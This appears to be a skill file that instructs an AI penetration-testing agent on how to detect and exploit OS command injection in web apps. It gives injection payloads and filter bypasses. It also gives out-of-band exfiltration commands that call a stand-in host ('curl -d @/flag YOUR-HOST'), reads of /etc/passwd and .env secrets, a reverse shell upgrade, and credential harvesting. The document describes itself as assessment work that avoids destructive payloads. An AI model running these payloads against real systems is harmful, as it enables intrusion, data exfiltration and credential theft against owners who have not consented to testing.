---
name: web-command-injection
description: OS command injection detection→exploitation→proof for web apps. Use when input reaches exec/system/spawn/shell_exec sinks, ping/dig/export/file-name features, or blind timing/OOB signals suggest server-side shell execution. Triggers - ;id, $(id), ${IFS}, backtick injection, sys.exec, shell_exec, blind command injection, OOB exfil.
tags: [vuln_assess, exploitation]
---

# Command Injection

## Detect
- Candidate sinks: ping/host/traceroute utilities, file converters, report generators, "export/download" features, hostname-in-config admin panels, any param echoed into server-side shell.
- Inject a differential pair, ONE param at a time:
  ```bash
  # benign + breaking pair — compare responses
  ?host=127.0.0.1          vs  ?host=127.0.0.1;id
  # separators to try: ; | `cmd` $(cmd) && || \n
  ```
- Blind (no output reflection): time-based `;sleep 8` vs baseline delta ≥8s; OOB callback via your listener (`curl http://YOUR-OOB-HOST/$(hostname)` or DNS lookup) — OOB beats sleep for reliability.
- Automated confirmation: save request → `sqlmap --os-shell` probing is NOT the tool here; use nuclei template or manual ffuf on the param with payload list. Keep it surgical — one param, one payload set.

## Decide
- Output reflected inline → direct read (`;id`, `;cat /etc/passwd`), fastest path.
- Blind but OOB works → exfil channel established; pull data via `;curl -d @/flag YOUR-HOST` chunked.
- Blind, no OOB, timing only → confirm with two sleeps of different durations (5s vs 10s scale correctly = real); extraction slow — prioritize ONE high-value read.
- Filter detected (spaces/semis stripped): `${IFS}` for spaces, `%0a` newline for semis, `$@`/brace expansion variants. Filter bypass ≠ RCE proof — still need command output.

## Exploit → PROVE IMPACT
- Minimum proof: verbatim `id && hostname` from target. Without it = suspected, Low/Medium cap.
- Escalate evidence value in order: `id` → readable sensitive file (`cat /var/www/html/.env`, quote real secret redacted half) → reverse shell for stable foothold:
  ```bash
  # stable TTY after reverse shell
  python3 -c 'import pty;pty.spawn("/bin/bash")'  then Ctrl-Z; stty raw -echo; fg
  ```
- Windows targets: `& whoami` syntax, PowerShell one-liners; `dir` not `ls`.
- Record: `state_update` vuln confirmed w/ EvidenceItem quoting command+output; harvested creds → Credential nodes.

## Tooling
- `state_update` every confirmed RCE (this is your flagship finding).
- Reverse shell / pivot setup → `tunnel_manage`. Post-RCE privesc → post-exploit phase skill. Web-adjacent services discovered → svc skills.
- If sink is SQLi-reachable instead (`xp_cmdshell`, COPY TO PROGRAM) → database skill owns that chain.

## False positives / pitfalls
- App echoing your INPUT back ≠ executing it — verify with output that requires execution (`id` output differs per host).
- Sleep-based hits can be queue/backlog noise — repeat 3× and vary duration before claiming.
- `2>&1` disabled: errors suppressed but command may still run — use `|| true` style tails or stdout-only payloads.
- WAF blocks `;` but not `|` or newline — enumerate ALL separators before declaring not-injectable.
- Command runs as service account (www-data) — don't overstate impact; root needs separate privesc proof.
- NEVER run destructive payloads (`rm`, `shutdown`, fork bombs) even if the filter allows them — operator unlock required for anything state-changing beyond read/exec-proof.
